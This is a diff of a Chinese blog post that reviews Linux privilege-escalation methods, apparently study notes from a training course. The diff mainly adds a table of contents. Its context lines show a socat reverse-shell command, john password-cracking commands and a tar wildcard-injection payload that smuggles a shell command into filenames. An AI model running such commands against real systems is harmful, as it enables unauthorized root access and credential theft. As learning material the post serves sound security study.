@@ -6,18 +6,19 @@ categories: 学习
 ---
 
 上次在实验楼看到一个关于linux提权的训练营，写的非常好，不过过了一段时间忘得也差不多了，这次就趁着楼赛再复习一遍吧。
+ 		 [**一.`passwd` 文件提权**](#一-passwd文件提权)
+ 		 [**二.`shadow` 文件提权**](#二-shadow文件提权)
+		 [**三.`SUID` 可执行文件提权**](#三-suid提权)
+		 [**四.`Cron Jobs` 定时任务提权**](#四-cronjobs提权)
+		 [**五.通配符注入提权**](#五-通配符注入提权)
+		 [**六.`sudo` 滥用提权**](#六-sudo提权)
+		 [**七.敏感文件提权**](#七-查找敏感文件提权)
+		 [**八.跳板用户提权**](#八-跳板用户提权)
+		 [**九.`Linux` 内核漏洞提权**](#九-内核漏洞提权)
+		 [**十.暴力破解提权**](#十-暴力破解提权)
+		 [**十一.自动化提权**](#十一-自动化提权工具)
 
-Linux 常用的提权方法如下：
 
-- `passwd/shadow` 文件提权
-- `SUID` 可执行文件提权
-- `Cron Jobs` 定时任务提权
-- 通配符注入提权
-- `sudo` 滥用提权
-- 敏感文件提权
-- 跳板用户提权
-- `Linux` 内核漏洞提权
-- 暴力破解提权
 
 ### 预备：将垃圾shell升级成具有交互功能的shell
 
@@ -63,7 +64,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:127.0.0.1:5912
 
 这种方式反弹回的 shell 最为完整，但需要目标主机支持 `socat` 工具。
 
-### 一. passwd 文件提权
+### 一. passwd文件提权
 
 通常来说，通过 `/etc/passwd` 提权的方法有两种：
 
@@ -130,7 +131,7 @@ john [--show] ~/hash.txt
 
 john 工具对于同一个破解文件中的同一条 hash 记录只会爆破一次，如果第二次执行 `john ~/hash.txt` 是不会得到结果的，如果想查看上一次爆破的结果，需要使用 `--show` 参数
 
-### 二. shadow 文件提权
+### 二. shadow文件提权
 
 `/etc/shadow` 文件用于存储**加密后的密码**和密码相关的配置信息，该文件的每一行代表一个用户，每行都包含 9 个字段，用冒号(":")隔开，顺序如下：
 
@@ -275,7 +276,7 @@ john ~/shadow_crack.txt
 
 至此，我们成功提权到 root 用户。
 
-### 三. SUID 提权
+### 三. SUID提权
 
 通常情况下，Linux 运行一个程序，是使用当前运行这个程序的用户权限，这种机制是非常合理的，但有一些程序比较特殊，比如我们常用的 `ping` 命令。
 
@@ -469,7 +470,7 @@ chmod +x suidcheck.sh
 
 实际上可通过 SUID 提权的命令远不止这三种，例如 `cat、vim、more、sed` 等命令也都可以进行 SUID 提权，但只要你掌握实验中提到的**提权思路**，其他命令也就能融会贯通了。
 
-### 四. Cron Jobs 提权
+### 四. CronJobs提权
 
 #### 1.什么是 Cron 定时任务
 
@@ -779,7 +780,7 @@ tar -zcf /var/backups/html.tgz /var/www/html/--checkpoint=1 /var/www/html/--chec
 
 这种情况下`/var/www/html/--checkpoint=1`和 `/var/www/html/--checkpoint-action=exec=sh shell.sh`就不会被 shell 解释为 tar 命令参数，所以无法注入成功。
 
-### 六. sudo 提权
+### 六. sudo提权
 
 #### 1.什么是 sudo 权限
 
